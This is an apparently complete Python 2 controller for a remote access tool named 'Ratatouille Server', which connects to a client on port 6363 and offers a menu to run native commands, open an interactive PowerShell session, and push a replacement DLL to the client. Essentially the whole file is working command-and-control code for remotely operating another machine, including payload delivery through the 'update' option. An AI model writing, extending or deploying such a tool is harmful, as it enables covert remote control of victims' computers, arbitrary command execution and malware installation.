from socket import socket, AF_INET, SOCK_STREAM
from os import system, name
from time import sleep

MAX_BUFFER_LENGTH = 200000


def echo(s_socket):
    """Print back the data that was passed to the client"""
    value = raw_input("#> ")
    bytes_value = to_bytes(len(value) + 5, 4, 'little')
    s_socket.send('d' + bytes_value + value)
    print(s_socket.recv(64))


def update(s_socket):
    """Send a new dll to the client and initial the update process"""
    dll = get_dll()
    bytes_value = to_bytes(len(dll) + 5, 4, 'little')
    s_socket.send('u' + bytes_value + dll)


def command(s_socket):
    """Tell the client to run a command natively"""
    command = raw_input("#> ")
    bytes_value = to_bytes(len(command) + 5, 4, 'little')
    s_socket.send('c' + bytes_value + command)

    print(s_socket.recv(MAX_BUFFER_LENGTH))


def shell(s_socket):
    """Open shell on the client"""
    shellname = "powershell"
    bytes_value = to_bytes(len(shellname), 4, 'little')
    s_socket.send('o' + bytes_value + shellname)
    value = raw_input(shellname + "#> ")
    while True:
        bytes_value = to_bytes(len(value), 4, 'little')
        s_socket.send('s' + bytes_value + value)
        print(s_socket.recv(20000))

        if 'exit' in value:
            break

        value = raw_input(shellname + "#> ")


def exit(s_socket):
    """Close the connection to the client"""
    s_socket.send("")


MENU = {0: exit, 1: echo, 2: update, 3: command, 4: shell}


def clear():
    """Implement clear screen for linux or windows systems"""
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')


def get_dll():
    """Convert a dll to binary string data"""
    with open("TcpServer.dll", "rb") as m_file:
        return m_file.read()


def to_bytes(n, length, endianess='big'):
    """
    Covert a number into bytes

    :param int n: The number to convert into bytes
    :param int length: The length require in bytes
    :param str endianess: Covertions for little / big endian memory
    """
    h = '%x' % n
    s = ('0' * (len(h) % 2) + h).zfill(length * 2).decode('hex')
    return s if endianess == 'big' else s[::-1]


def print_menu():
    """Print the GUI menu for the program"""
    clear()
    print("Ratatouille Server")
    print("---------------------------")
    print("")

    for (index, func) in MENU.items():
        print("%d - %s" % (index, func.__name__))

    return raw_input("Choose an option: ").lstrip()


def main():

    user_choice = -1
    while user_choice not in MENU.keys():
        try:
            user_choice = int(print_menu())
            if user_choice not in MENU.keys():
                print('Option does not exist...')
                sleep(1)
        except:
            print("No a valid option!")
            sleep(1)

        s = socket(AF_INET, SOCK_STREAM)

        PORT = 6363

        # HOST = '192.168.137.1'
        # HOST = '127.0.0.1'

        try:
            HOST = raw_input("Select IP: ")
            if '.' not in HOST:
                raise ValueError("No a valid IP")
        except:
            HOST = '127.0.0.1'

        try:
            s.connect((HOST, PORT))
            MENU[user_choice](s)
            sleep(2)

            user_choice = -1
        except Exception as e:
            print(e)


if __name__ == '__main__':
    main()
